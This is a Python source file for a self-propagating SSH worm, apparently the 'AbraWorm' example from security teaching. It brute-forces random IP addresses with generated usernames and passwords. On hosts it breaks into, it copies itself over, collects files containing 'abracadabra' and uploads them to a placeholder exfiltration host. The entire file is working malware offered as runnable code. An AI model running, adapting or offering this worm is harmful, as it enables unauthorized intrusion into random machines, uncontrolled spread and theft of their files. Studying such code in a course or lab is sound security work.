import sys
import os
import random
import paramiko
import scp
import signal

def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)

signal.signal(signal.SIGINT, sig_handler)
debug = 0

NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = 'bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum bus but buz cam cat ced cel cin cid cip cir con cod cos cop cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil kim kin kip kir kis kit kix laf lad laf lag led leg lem len let nab nac nad nag nal nam nan nap nar nas nat oda ode odi odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak pal pam pap par pas pat pek pem pet qik rab rob rik rom sab sad sag sak sam sap sas sat sit sid sic six tab tad tom tod wad was wot xin zap zuk'
digrams = 'al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi ho hu in is it le of on ou or ra re ti to te sa se si ve ur'

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug:
        return ['xxxxxxx']
    if how_many == 0:
        return []

    selector = "{0:03b}".format(random.randint(0, 7))
    usernames = [
        ''.join(map(lambda x: random.sample(trigrams, 1)[0] if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3)))
        for _ in range(how_many)
    ]
    return usernames

def get_new_passwds(how_many):
    if debug:
        return ['xxxxxxx']  # need a working username for debugging
    if how_many == 0:
        return []

    selector = "{0:03b}".format(random.randint(0, 7))
    passwds = [
        ''.join(map(lambda x: random.sample(trigrams, 1)[0] + (str(random.randint(0, 9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3)))
        for _ in range(how_many)
    ]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug:
        return ['128.46.144.123']
    if how_many == 0:
        return []

    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(lambda x: str(1 + random.randint(0, x)), [223, 223, 223, 223])
        ipaddresses.append(f'{first}.{second}.{third}.{fourth}')
    return ipaddresses

while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)

    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd, user, ip_address))
                files_of_interest_at_target = []

                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("\n\nconnected\n")

                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))

                    if ''.join(received_list).find('AbraWorm') >= 0:
                        print("\nThe target machine is already infected\n")
                        continue

                    cmd = 'grep -ls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error:
                        print(error)
                        continue

                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

                    scpcon = scp.SCPClient(ssh.get_transport())
                    if files_of_interest_at_target:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                            scpcon.put(sys.argv[0])
                        scpcon.close()
                except Exception as e:
                    print(f"Connection error: {e}")
                    continue

                if files_of_interest_at_target:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect('yyy.yyy.yyy.yyy', port=22, username='yyyy', password='yyyyyyy', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exfiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except Exception as e:
                        print(f"No uploading of exfiltrated files: {e}")
                        continue

                if debug:
                    break
